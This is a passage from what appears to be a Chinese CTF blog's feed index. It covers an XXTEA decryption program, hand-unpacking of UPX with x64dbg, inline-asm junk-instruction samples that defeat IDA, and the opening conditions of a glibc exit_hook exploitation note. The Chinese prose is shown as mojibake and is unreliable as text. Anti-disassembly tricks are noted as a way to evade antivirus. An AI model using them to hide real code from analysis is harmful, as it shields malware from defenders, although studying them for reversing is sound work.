<span class="hljs-number">0x54</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x7d</span>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> cipher[] = &#123;<span class="hljs-number">0xc3</span> ,<span class="hljs-number">0x43</span> ,<span class="hljs-number">0x20</span> ,<span class="hljs-number">0xf3</span> ,<span class="hljs-number">0xcc</span> ,<span class="hljs-number">0x78</span> ,<span class="hljs-number">0x3</span> ,<span class="hljs-number">0xc8</span> ,<span class="hljs-number">0x65</span> ,<span class="hljs-number">0x46</span> ,<span class="hljs-number">0x9b</span> ,<span class="hljs-number">0x7</span> ,<span class="hljs-number">0xae</span> ,<span class="hljs-number">0xcb</span> ,<span class="hljs-number">0x78</span> ,<span class="hljs-number">0x23</span> ,<span class="hljs-number">0xe7</span> ,<span class="hljs-number">0x4f</span> ,<span class="hljs-number">0xe0</span> ,<span class="hljs-number">0xe4</span> ,<span class="hljs-number">0x6a</span> ,<span class="hljs-number">0x80</span> ,<span class="hljs-number">0xbe</span> ,<span class="hljs-number">0xcc</span> ,<span class="hljs-number">0x21</span> ,<span class="hljs-number">0xbc</span> ,<span class="hljs-number">0x2f</span> ,<span class="hljs-number">0xa9</span> ,<span class="hljs-number">0x1d</span> ,<span class="hljs-number">0xff</span> ,<span class="hljs-number">0xc1</span> ,<span class="hljs-number">0x64</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><br>    <span class="hljs-comment">// åŠ å¯† plain</span><br>    xxtea((u32 *)plain, <span class="hljs-keyword">sizeof</span>(plain) / <span class="hljs-number">4</span>, (u32 *)keys);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Encrypted plain: &quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(plain); i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%02x, &quot;</span>, plain[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>    <span class="hljs-comment">// è§£å¯† cipher</span><br>    xxtea((u32 *)cipher, -(<span class="hljs-keyword">sizeof</span>(cipher) / <span class="hljs-number">4</span>), (u32 *)keys);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Decrypted cipher: &quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(cipher); i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, cipher[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Goè¯­è¨€é€†å‘å…¥é—¨</title>
    <link href="/2025/01/16/Go%E8%AF%AD%E8%A8%80%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8/"/>
    <url>/2025/01/16/Go%E8%AF%AD%E8%A8%80%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>æ‰‹è„±UPXå£³ä¸æ±‚äººæ•™ç¨‹</title>
    <link href="/2025/01/15/%E6%89%8B%E8%84%B1UPX%E5%A3%B3%E4%B8%8D%E6%B1%82%E4%BA%BA%E6%95%99%E7%A8%8B/"/>
    <url>/2025/01/15/%E6%89%8B%E8%84%B1UPX%E5%A3%B3%E4%B8%8D%E6%B1%82%E4%BA%BA%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="æ‰‹è„±UPXå£³ä¸æ±‚äººæ•™ç¨‹"><a href="#æ‰‹è„±UPXå£³ä¸æ±‚äººæ•™ç¨‹" class="headerlink" title="æ‰‹è„±UPXå£³ä¸æ±‚äººæ•™ç¨‹"></a>æ‰‹è„±UPXå£³ä¸æ±‚äººæ•™ç¨‹</h1><p>å°ç™½ï¼šâ€œä¸ºä»€ä¹ˆè¦æ‰‹è„±UPXå£³å‘€ï¼Ÿupx -dã€€ä¸é¦™å—ï¼Ÿâ€<br>é«˜æ‰‹ï¼šâ€œé¦™ä¸ªè›‹ï¼Œå‡ºé¢˜äººå„ä¸ªå¿ƒé‡Œé˜´æš—ï¼Œèƒ½ç»™ä½ upx -dçš„æœºä¼šä¸å¤šäº†ã€‚â€</p><h2 id="ESPå®šå¾‹"><a href="#ESPå®šå¾‹" class="headerlink" title="ESPå®šå¾‹"></a>ESPå®šå¾‹</h2><p>ä¸ªäººè®¤ä¸ºè¿™ä¸ªæ–¹æ³•æ˜¯æœ€æ–¹ä¾¿ï¼Œæœ€å¿«æ·çš„ï¼ŒæŒæ¡è¿™ä¸ªæ–¹æ³•åŸºæœ¬çš„UPXå£³é—­çœ¼è„±</p><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>ESP å®šå¾‹çš„åŸç†åœ¨äºåˆ©ç”¨ç¨‹åºä¸­å †æ ˆå¹³è¡¡æ¥å¿«é€Ÿæ‰¾åˆ° OEP.</p><p>ç”±äºåœ¨ç¨‹åºè‡ªè§£å¯†æˆ–è€…è‡ªè§£å‹è¿‡ç¨‹ä¸­, ä¸å°‘å£³ä¼šå…ˆå°†å½“å‰å¯„å­˜å™¨çŠ¶æ€å‹æ ˆ, å¦‚ä½¿ç”¨<code>pushad</code>, åœ¨è§£å‹ç»“æŸå, ä¼šå°†ä¹‹å‰çš„å¯„å­˜å™¨å€¼å‡ºæ ˆ, å¦‚ä½¿ç”¨<code>popad</code>. å› æ­¤åœ¨å¯„å­˜å™¨å‡ºæ ˆæ—¶, å¾€å¾€ç¨‹åºä»£ç è¢«æ¢å¤, æ­¤æ—¶ç¡¬ä»¶æ–­ç‚¹è§¦å‘. ç„¶ååœ¨ç¨‹åºå½“å‰ä½ç½®, åªéœ€è¦å°‘è®¸å•æ­¥æ“ä½œ, å°±å¾ˆå®¹æ˜“åˆ°è¾¾æ­£ç¡®çš„ OEP ä½ç½®.</p><ol><li>ç¨‹åºåˆšè½½å…¥å¼€å§‹ pushad&#x2F;pushfd</li><li>å°†ç¬¬ä¸€ä¸ªå¯„å­˜å™¨å‹å…¥æ ˆåå°±è®¾å¯¹ ESP å¯„å­˜å™¨è®¾ç¡¬ä»¶æ–­ç‚¹</li><li>è¿è¡Œç¨‹åº, è§¦å‘æ–­ç‚¹ï¼Œè¿™æ˜¯upxç¨‹åºå‡ ä¹ç»“æŸ</li></ol><h3 id="ä¾‹é¢˜è®²è§£"><a href="#ä¾‹é¢˜è®²è§£" class="headerlink" title="ä¾‹é¢˜è®²è§£"></a>ä¾‹é¢˜è®²è§£</h3><p>idaåç¼–è¯‘ä¸€ä¸ªåŠ upxå£³çš„å‘ç°å‡½æ•°å¾ˆå°‘ï¼Œä½†æ˜¯å¯ä»¥å‘ç°ï¼Œstartå‡½æ•°å¼€å§‹æœ‰å¾ˆå¤špushæ“ä½œ</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115225432603.png" alt="image-20250115225432603"></p><p>æ‰“å¼€x64dbgè¿›è¡Œè°ƒè¯•ï¼ŒæŒ‡å‘åˆ°ç¬¬äºŒä¸ªpushåœæ­¢</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115225742755.png" alt="image-20250115225742755"></p><p>ç„¶åå†å³ä¸‹æ ˆçª—å£ç»™espä¸‹ç¡¬ä»¶è®¿é—®æ–­ç‚¹ï¼Œ64ä½8å­—èŠ‚ï¼Œ32ä½4å­—èŠ‚</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115225858495.png" alt="image-20250115225858495"></p><p>æ¥ä¸‹æ¥ç›´æ¥è¿è¡Œï¼Œå°±ä¼šæ–­åœ¨upxå£³å¿«ç»“æŸçš„ä½ç½®</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115230107554.png" alt="image-20250115230107554"></p><p>æ¥ç€ä¸€ç›´å¾€ä¸‹è¿è¡Œï¼Œç›´åˆ°ä¸€ä¸ªå¤§çš„è·³è½¬ï¼Œå°±æ˜¯åˆ°è¾¾OEP</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115230300395.png" alt="image-20250115230300395"></p><p>åˆ°è¾¾OEPåå°±ç”¨x64dbgè‡ªå¸¦çš„æ’ä»¶è¿›è¡Œdumpå’ŒIATçš„ä¿®å¤</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115230506018.png" alt="image-20250115230506018"></p><p>åœ¨ç¬¬å››æ­¥çš„æ—¶å€™ï¼Œå¦‚æœå‡ºç°çº¢è‰²Ã—å°±åˆ é™¤æ‰</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115230603184.png" alt="image-20250115230603184"></p><p>ä¸Šè¾¹æ­¥éª¤å·²ç»å®Œæˆäº†dumpå’ŒIATçš„ä¿®å¤ï¼Œä½†æ˜¯å¯èƒ½ç¨‹åºä»ç„¶ä¸èƒ½è¿è¡Œ</p><p>è¿™æ—¶å€™æˆ‘ä»¬å°±è¦å»é™¤é‡å®šä½</p><p>æˆ‘ä»¬éœ€è¦ä¿®æ”¹å…¶PEç»“æ„ä¸­çš„ä¸¤ä¸ªå­—æ®µå€¼ï¼š</p><ol><li>File Header çš„ Charateristics</li><li>Optional Headerçš„ DllCharateristics</li></ol><p>ä¸‹é¢ç”¨å°è¾£æ¤’(CFF Explorer VII)è¿›è¡Œä¿®å¤</p><p>ç¬¬ä¸‰æ­¥å‹¾é€‰ä¸Š</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115231709951.png" alt="image-20250115231709951"></p><p>ç¬¬ä¸‰æ­¥å–æ¶ˆå‹¾é€‰</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115231854920.png" alt="image-20250115231854920"></p><p>è¿™æ ·ä¸€ä¸ªå®Œæ•´çš„è„±å£³æµç¨‹å°±å®Œæˆäº†</p><p>å¯èƒ½éœ€è¦è‡ªå·±æ‰¾åˆ°mainå‡½æ•°ğŸ˜­</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115232224281.png" alt="image-20250115232224281"></p><blockquote><p>å…¶ä»–è„±å£³æ–¹æ³•å¾…è¡¥å……ã€‚ã€‚ã€‚ã€‚</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ‰‹è„±UPXå£³</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>èŠ±æŒ‡ä»¤é€å½»åˆ†æ</title>
    <link href="/2025/01/15/%E8%8A%B1%E6%8C%87%E4%BB%A4%E9%80%8F%E5%BD%BB%E5%88%86%E6%9E%90/"/>
    <url>/2025/01/15/%E8%8A%B1%E6%8C%87%E4%BB%A4%E9%80%8F%E5%BD%BB%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="èŠ±æŒ‡ä»¤é€å½»åˆ†æ"><a href="#èŠ±æŒ‡ä»¤é€å½»åˆ†æ" class="headerlink" title="èŠ±æŒ‡ä»¤é€å½»åˆ†æ"></a>èŠ±æŒ‡ä»¤é€å½»åˆ†æ</h1><h2 id="0x01-èŠ±æŒ‡ä»¤ä»‹ç»"><a href="#0x01-èŠ±æŒ‡ä»¤ä»‹ç»" class="headerlink" title="0x01 èŠ±æŒ‡ä»¤ä»‹ç»"></a>0x01 èŠ±æŒ‡ä»¤ä»‹ç»</h2><p>èŠ±æŒ‡ä»¤å®è´¨å°±æ˜¯ä¸€ä¸²åƒåœ¾æŒ‡ä»¤ï¼Œå®ƒä¸ç¨‹åºæœ¬èº«çš„åŠŸèƒ½æ— å…³ï¼Œå¹¶ä¸å½±å“ç¨‹åºæœ¬èº«çš„é€»è¾‘ã€‚åœ¨è½¯ä»¶ä¿æŠ¤ä¸­èŠ±æŒ‡ä»¤è¢«ä½œä¸ºä¸€ç§æ‰‹æ®µæ¥å¢åŠ <strong>é™æ€åˆ†æ</strong>çš„éš¾åº¦ï¼ŒèŠ±æŒ‡ä»¤ä¹Ÿå¯ä»¥è¢«ç”¨åœ¨ç—…æ¯’æˆ–æœ¨é©¬ä¸Šï¼Œé€šè¿‡åŠ å…¥èŠ±æŒ‡ä»¤æ”¹å˜ç¨‹åºçš„ç‰¹å¾ç ï¼Œèº²é¿æ€è½¯çš„æ‰«æï¼Œä»è€Œè¾¾åˆ°å…æ€çš„ç›®çš„ã€‚èŠ±æŒ‡ä»¤ä¸€èˆ¬è¢«åˆ†ä¸ºä¸¤ç±»ï¼šä¼šè¢«æ‰§è¡Œçš„å’Œä¸ä¼šè¢«æ‰§è¡Œçš„ï¼ˆåƒåœ¾æŒ‡ä»¤ï¼‰ã€‚</p><h2 id="0x02-ä¼šè¢«æ‰§è¡ŒèŠ±æŒ‡ä»¤"><a href="#0x02-ä¼šè¢«æ‰§è¡ŒèŠ±æŒ‡ä»¤" class="headerlink" title="0x02 ä¼šè¢«æ‰§è¡ŒèŠ±æŒ‡ä»¤"></a>0x02 ä¼šè¢«æ‰§è¡ŒèŠ±æŒ‡ä»¤</h2><p>è¿™ç±»èŠ±æŒ‡ä»¤æœ¬èº«æ˜¯æ­£å¸¸çš„æ±‡ç¼–æŒ‡ä»¤ï¼Œå®ƒä»¬è¿è¡Œå®Œåä¸ä¼šæ”¹å˜åŸæ¥ç¨‹åºçš„å †æ ˆ&#x2F;å¯„å­˜å™¨ï¼Œä½†èƒ½èµ·åˆ°å¹²æ‰°é™æ€åˆ†æçš„ä½œç”¨ã€‚ä¸€èˆ¬åˆ†ä¸ºä¸¤ç§ï¼š</p><ul><li>å½¢å¼ä¸€ï¼šæ”¹å˜å †æ ˆæ“ä½œ</li><li>å½¢å¼äºŒï¼šåˆ©ç”¨callæˆ–è€…jmpæŒ‡ä»¤å¢åŠ æ‰§è¡Œæµå¤æ‚åº¦</li></ul><h3 id="å½¢å¼ä¸€"><a href="#å½¢å¼ä¸€" class="headerlink" title="å½¢å¼ä¸€"></a>å½¢å¼ä¸€</h3><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;push %eax\n&quot;</span><br>        <span class="hljs-string">&quot;add $4, %esp&quot;</span><br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;P0ach1l\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”¨32ä½ç¼–è¯‘ä¸€ä¸‹ï¼Œæ­£å¸¸æ¥è¯´åº”è¯¥idaè¯†åˆ«ä¸å‡ºæ¥ï¼Œä½†æ˜¯ä¸çŸ¥é“ä»€ä¹ˆæƒ…å†µï¼Œæˆ‘çš„idaå°±èƒ½è¯†åˆ«å‡ºæ¥ï¼Œæš‚ä¸”ä¸ç®¡ã€‚</p><h3 id="å½¢å¼äºŒ"><a href="#å½¢å¼äºŒ" class="headerlink" title="å½¢å¼äºŒ"></a>å½¢å¼äºŒ</h3><h4 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>æ‰§è¡Œcallæ‰§è¡Œæ—¶ä¼šå‘å †æ ˆä¸­å‹å…¥<strong>è¿”å›åœ°å€</strong>ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹è¿™ä¸ª<strong>è¿”å›åœ°å€</strong>ï¼Œé…åˆretæŒ‡ä»¤è·³è½¬åˆ°<strong>ä»»æ„</strong>ä¸€ä¸ªæƒ³å»çš„åœ°æ–¹ã€‚</p><p>ç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    __asm__ (<br>        <span class="hljs-string">&quot;call xxx\n&quot;</span>              <span class="hljs-comment">// è°ƒç”¨ xxx æ ‡ç­¾</span><br>    <span class="hljs-string">&quot;xxx:\n&quot;</span><br>        <span class="hljs-string">&quot;add $0x7, (%esp)\n&quot;</span>      <span class="hljs-comment">// åœ¨æ ˆé¡¶åŠ ä¸Š 0x7</span><br>        <span class="hljs-string">&quot;ret\n&quot;</span>                  <span class="hljs-comment">// è¿”å›</span><br>        <span class="hljs-string">&quot;nop\n&quot;</span>                    <span class="hljs-comment">// ç©ºæ“ä½œï¼Œå  1 å­—èŠ‚</span><br>        <span class="hljs-string">&quot;nop\n&quot;</span>                    <span class="hljs-comment">// ç©ºæ“ä½œï¼Œå  1 å­—èŠ‚</span><br>        <span class="hljs-string">&quot;nop\n&quot;</span>                    <span class="hljs-comment">// ç©ºæ“ä½œï¼Œå  1 å­—èŠ‚</span><br>        <span class="hljs-string">&quot;nop\n&quot;</span>                    <span class="hljs-comment">// ç©ºæ“ä½œï¼Œå  1 å­—èŠ‚</span><br>        <span class="hljs-string">&quot;nop\n&quot;</span>                    <span class="hljs-comment">// ç©ºæ“ä½œï¼Œå  1 å­—èŠ‚</span><br>        <span class="hljs-string">&quot;nop\n&quot;</span> <br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello World!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>32ä½ç¼–è¯‘ä¸€ä¸‹ï¼Œç„¶åæˆ‘ä»¬è¿è¡Œä¸€ä¸‹ï¼Œçœ‹æœ‰æ²¡æœ‰é—®é¢˜ï¼Œç»“æœå¾ˆæ˜¾ç„¶ï¼Œéå¸¸æ­£å¸¸</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115215537192.png" alt="image-20250115215537192"></p><p>ç”¨idaåç¼–è¯‘ä¸€ä¸‹ï¼Œçœ‹çœ‹èŠ±æŒ‡ä»¤åˆ°åº•å½±å“æˆ‘ä»¬çš„idaè¯†åˆ«æ²¡æœ‰</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115215636631.png" alt="image-20250115215636631"></p><p>ç›´æ¥é£˜çº¢ï¼ŒF5åç»™å‡ºæ— æ•ˆåç¼–è¯‘ä»£ç </p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115215722649.png" alt="image-20250115215722649"></p><p>idaè®¤ä¸ºåˆ°ç¬¬ä¸€ä¸ªretå°±ç»“æŸmainå‡½æ•°äº†</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115215825151.png" alt="image-20250115215825151"></p><h4 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h4><p>æˆ‘ä»¬å°±æ ¹æ®addæŒ‡ä»¤æŠŠespæŒ‡å‘çš„åœ°å€åŠ å‡ ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬å°±nopå‡ ä¸ªå­—èŠ‚ï¼Œç„¶åEdit functionæ”¹ä¸€ä¸‹å‡½æ•°ç»“æŸåœ°å€å°±ä¿®å¤æˆåŠŸäº†</p><h2 id="0x03-ä¸ä¼šè¢«æ‰§è¡ŒèŠ±æŒ‡ä»¤"><a href="#0x03-ä¸ä¼šè¢«æ‰§è¡ŒèŠ±æŒ‡ä»¤" class="headerlink" title="0x03 ä¸ä¼šè¢«æ‰§è¡ŒèŠ±æŒ‡ä»¤"></a>0x03 ä¸ä¼šè¢«æ‰§è¡ŒèŠ±æŒ‡ä»¤</h2><p>èŠ±æŒ‡ä»¤è™½ç„¶è¢«æ’å…¥åˆ°äº†æ­£å¸¸ä»£ç çš„ä¸­é—´ï¼Œä½†æ˜¯å¹¶ä¸æ„å‘³ç€å®ƒä¸€å®šä¼šå¾—åˆ°æ‰§è¡Œã€‚è¿™ç±»èŠ±æŒ‡ä»¤ä¸€èˆ¬ä¸å±äºCPUå¯ä»¥è¯†åˆ«çš„æ“ä½œç ï¼Œé‚£ä¹ˆå°±éœ€è¦åœ¨ä¸Šé¢ç”¨è·³è½¬è·³è¿‡è¿™äº›èŠ±æŒ‡ä»¤æ‰èƒ½ä¿è¯ç¨‹åºçš„æ­£å¸¸è¿è¡Œ</p><h3 id="å½¢å¼ä¸€-1"><a href="#å½¢å¼ä¸€-1" class="headerlink" title="å½¢å¼ä¸€"></a>å½¢å¼ä¸€</h3><h4 id="åŸç†-2"><a href="#åŸç†-2" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>å¦‚æœæˆ‘ä»¬æ’å…¥çš„èŠ±æŒ‡ä»¤æ˜¯ä¸€ä¸ªæ“ä½œç ï¼Œé‚£ä¹ˆåé¢ç¨‹åºåŸæœ¬çš„æœºå™¨ç å°±ä¼šè¢«è¯¯è®¤ä¸ºæ˜¯è¿™ä¸ªæ“ä½œç çš„æ“ä½œæ•°ï¼Œä»è€Œå¯¼è‡´åæ±‡ç¼–å¼•æ“çš„è§£æé”™è¯¯ã€‚</p><p>ç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    __asm__ (<br>        <span class="hljs-string">&quot;xor %eax, %eax\n&quot;</span>           <span class="hljs-comment">// XOR eax, eax</span><br>        <span class="hljs-string">&quot;jz xxx\n&quot;</span>                   <span class="hljs-comment">// è·³è½¬åˆ° xxx æ ‡ç­¾ï¼ˆå¦‚æœ eax ä¸º 0ï¼‰</span><br>        <span class="hljs-string">&quot;.byte 0x11\n&quot;</span><br>        <span class="hljs-string">&quot;.byte 0x22\n&quot;</span><br>        <span class="hljs-string">&quot;.byte 0x33\n&quot;</span>                 <span class="hljs-comment">// æ’å…¥å­—èŠ‚ 0x33</span><br>    <span class="hljs-string">&quot;xxx:\n&quot;</span><br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;P0ach1l&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ç”±äºç»è¿‡xoreaxï¼Œeaxåï¼ŒZFæ ‡å¿—ä½è¢«ç½®ä¸º1ï¼Œé‚£ä¹ˆjzè¿™æ¡è·³è½¬æŒ‡ä»¤å¿…å®šä¼šè¢«æ‰§è¡Œï¼Œåé¢æ’å…¥çš„0x11,0x22,0x33å°±ä¼šè¢«è·³è¿‡ï¼Œç¨‹åºæ­£å¸¸è¿è¡Œã€‚</p><p>idaåç¼–è¯‘æ•ˆæœ</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115222646010.png" alt="image-20250115222646010"></p><h4 id="ä¿®å¤-1"><a href="#ä¿®å¤-1" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h4><p>åªéœ€è¦æŠŠè·³è½¬ä¸­é—´ä¸ä¼šè¢«æ‰§è¡Œçš„æŒ‡ä»¤nopæ‰å°±è¡Œäº†</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115223038950.png" alt="image-20250115223038950"></p><h3 id="å½¢å¼äºŒ-1"><a href="#å½¢å¼äºŒ-1" class="headerlink" title="å½¢å¼äºŒ"></a>å½¢å¼äºŒ</h3><h4 id="åŸç†-3"><a href="#åŸç†-3" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>æ’å…¥çš„èŠ±æŒ‡ä»¤ä¹Ÿå¯ä»¥æ˜¯æ”¹å˜å †æ ˆå¹³è¡¡çš„æ±‡ç¼–ä»£ç ï¼Œè·Ÿå½¢å¼ä¸€ç›¸åŒï¼Œåœ¨è¿™äº›èŠ±æŒ‡ä»¤ä¸Šé¢å†™ä¸Šè·³è½¬æŒ‡ä»¤ï¼Œè™½ç„¶èŠ±æŒ‡ä»¤ä¸ä¼šè¢«æ‰§è¡Œï¼Œä½†æ˜¯IDAè¿›è¡Œè§£ææ—¶ä¼šè®¤ä¸ºè¯¥å‡½æ•°å †æ ˆä¸å¹³è¡¡ï¼Œä»è€Œä½¿F5åŠŸèƒ½å¤±æ•ˆã€‚</p><p>ç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    __asm__ (<br>        <span class="hljs-string">&quot;xor %eax, %eax\n&quot;</span><br>        <span class="hljs-string">&quot;jz s\n&quot;</span><br>        <span class="hljs-string">&quot;add $0x11, %esp\n&quot;</span><br>    <span class="hljs-string">&quot;s:\n&quot;</span><br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;P0ach1l\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>idaåç¼–è¯‘æ•ˆæœ</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115223535266.png" alt="image-20250115223535266"></p><h4 id="ä¿®å¤-2"><a href="#ä¿®å¤-2" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h4><p>ç±»ä¼¼äºå½¢å¼ä¸€ï¼ŒæŠŠä¸­é—´è·³è¿‡çš„å­—èŠ‚nopæ‰å°±è¡Œ</p>]]></content>
    
    
    <categories>
      
      <category>Reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>èŠ±æŒ‡ä»¤</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>exit_hookç›¸å…³åˆ©ç”¨</title>
    <link href="/2024/12/10/exit-hook%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8/"/>
    <url>/2024/12/10/exit-hook%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="exit-hookç›¸å…³åˆ©ç”¨"><a href="#exit-hookç›¸å…³åˆ©ç”¨" class="headerlink" title="exit_hookç›¸å…³åˆ©ç”¨"></a>exit_hookç›¸å…³åˆ©ç”¨</h1><h2 id="glibc2-34ä¹‹å‰"><a href="#glibc2-34ä¹‹å‰" class="headerlink" title="glibc2.34ä¹‹å‰"></a>glibc2.34ä¹‹å‰</h2><h3 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶:"></a><strong>åˆ©ç”¨æ¡ä»¶:</strong></h3><blockquote><ul><li>è‡³å°‘æœ‰ä¸€æ¬¡ä»»æ„å†™</li><li>ç¨‹åºå¯ä»¥ç»“æŸ(å¯æ˜¾å¼è§¦å‘<code>exit</code>å‡½æ•° æˆ– ä¸»å‡½æ•°ç”±<code>libc_start_main</code>å¯åŠ¨ä¸”å¯æ­£å¸¸é€€å‡º)ï¼Œè°ƒç”¨åˆ°<code>_dl_fini</code> 